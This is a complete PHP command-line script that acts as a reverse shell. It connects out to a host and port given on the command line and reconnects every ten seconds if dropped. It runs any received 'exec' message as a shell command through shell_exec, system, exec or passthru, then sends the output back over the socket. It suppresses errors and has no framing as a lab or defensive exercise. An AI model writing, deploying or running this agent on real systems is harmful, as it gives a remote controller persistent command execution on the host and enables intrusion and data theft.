#!/usr/bin/php -q
<?php

	error_reporting(0);	// suppress warnings??

	set_time_limit(0);
	ob_implicit_flush(1);

	$short = "h:p:";
	$long  = array(
		"host:",
		"port:"
	);
	$opts  = getopt($short,$long);


	if(count($opts) < 2){
		die("Assign remote ip [-h/--host] and port [-p/--port]\n");
	}

	$addr 	= array_key_exists("host", $opts) ? trim($opts['host']) : trim($opts['h']);
	$port 	= array_key_exists("port", $opts) ? trim($opts['port']) : trim($opts['p']);

	if (($socket = socket_create(AF_INET, SOCK_STREAM, SOL_TCP)) === false) {
	     die("[\33[91m!\33[0m] socket_create() failed: reason: " .socket_strerror(socket_last_error())."\n");
	}

	echo "Connecting to [".$addr.":".$port."]...\n";

	if ((@$result = socket_connect($socket, $addr, $port)) === false){
	    die("[\33[91m!\33[0m] socket_connect failed: reason: " .socket_strerror(socket_last_error($socket))."\n");
	} 

	echo "\33[32mConnected to host [".$addr.":".$port."]\33[0m\n";

	while (true) {

		$now = date('d/m H:i:s');

	    if(($recv = socket_read($socket, 1024)) === false || $recv === "")
	    {
	    	// try to reconnect - 10 sec interval

	    	echo "[\33[91m!\33[0m] Empty stream.. Disconnected.\n";
	    	sleep(10);

    		if (($socket = socket_create(AF_INET, SOCK_STREAM, SOL_TCP)) === false) {
	     		 echo "[\33[91m!\33[0m] socket_create() failed: reason: " .socket_strerror(socket_last_error())."\n";
			}

			echo "Connecting to [".$addr.":".$port."]...\n";

			if ((@$result = socket_connect($socket, $addr, $port)) === false){
			    echo "[\33[91m!\33[0m] socket_connect failed: reason: " .socket_strerror(socket_last_error($socket))."\n";
			} 

			else echo "\33[32mConnected to host [".$addr.":".$port."]\33[0m\n";

	    }
	    else
	    {		    	
	    	if(preg_match('/^(exec)\s/', $recv, $matches, PREG_OFFSET_CAPTURE))
	    	{
    			$full_cmd = "{ ".preg_replace('/(;)+(\s)*/', ';', trim(substr($recv, 4)));
				$full_cmd = preg_replace("(exec)", "", $full_cmd);
				$full_cmd .= substr($full_cmd, -1) !== ';' ? "; } 2>&1;" : " } 2>&1;";


				if(function_exists('shell_exec'))
				{
					$fnc = "shell_exec()";
					if(!($result = @shell_exec($full_cmd)))
					{
						$result = "Error";
						break;
					}
				}

				else if(function_exists('system'))
				{ 	
					$fnc = "system()";
					@ob_start(); 	

					if(!($result = @system($full_cmd)))
					{
						$result = "Error";
						break;
					}

					$result = @ob_get_contents(); 		
					@ob_end_clean(); 
				}

				else if(function_exists('exec'))
				{ 
					$fnc = "exec()";
					@exec($full_cmd,$results,$ret_status);

					if($ret_status !== 0)
					{
						$result = "Error";
						break;
					}

					$result = ""; 		

					foreach($results as $res)
					{ 			
						$result .= $res."\n\r"; 		
					} 
				}

				else if(function_exists('passthru'))
				{ 		
					$fnc = "passthru()";
					@ob_start(); 		
					@passthru($full_cmd); 		
					$result = @ob_get_contents(); 		
					@ob_end_clean(); 
				}

				else
				{
					$result = "Error :: System calls disabled..";
				}

				$result .= "\n\rexecuted:: $fnc\n\rcmd:: $full_cmd";

	    		if(socket_write($socket, $result, strlen($result)) === false)
	    		{	
		        	echo "\33[91mCommand not set\33[0m: ".socket_strerror(socket_last_error($socket))."\n";
		        }
	    	}

	    	else if (preg_match('/(dc)/', $recv, $matches, PREG_OFFSET_CAPTURE))
	    	{
	    		break;
	    	}

	    	else echo "[".$now. "] Server ".$addr.": ".$recv."\n";
	    }
	}
	echo "Closing socket.\n";
	socket_close($socket);
	exit(0);
?>
